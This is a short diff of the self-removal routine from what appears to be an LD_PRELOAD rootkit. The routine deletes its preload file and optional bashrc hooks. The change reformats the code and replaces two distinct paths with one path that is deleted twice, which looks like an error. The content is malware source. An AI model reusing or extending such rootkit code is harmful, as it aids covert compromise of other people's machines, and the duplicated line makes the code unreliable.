@@ -1,13 +1,12 @@
 int remove_self(void){
-    if(not_user(0)) return VINVALID_PERM;
+    if(not_user(0))
+        return VINVALID_PERM;
 
-    /* rm our preload file so that new processes henceforth
-     * are clean processes. */
     hook(CUNLINK);
     call(CUNLINK, PRELOAD_FILE);
 #ifdef ROOTKIT_BASHRC
-    call(CUNLINK, INSTALL_DIR"/.bashrc");
-    call(CUNLINK, INSTALL_DIR"/.profile");
+    call(CUNLINK, BASHRC_PATH);
+    call(CUNLINK, BASHRC_PATH);
 #endif
 
     pid_t pid;
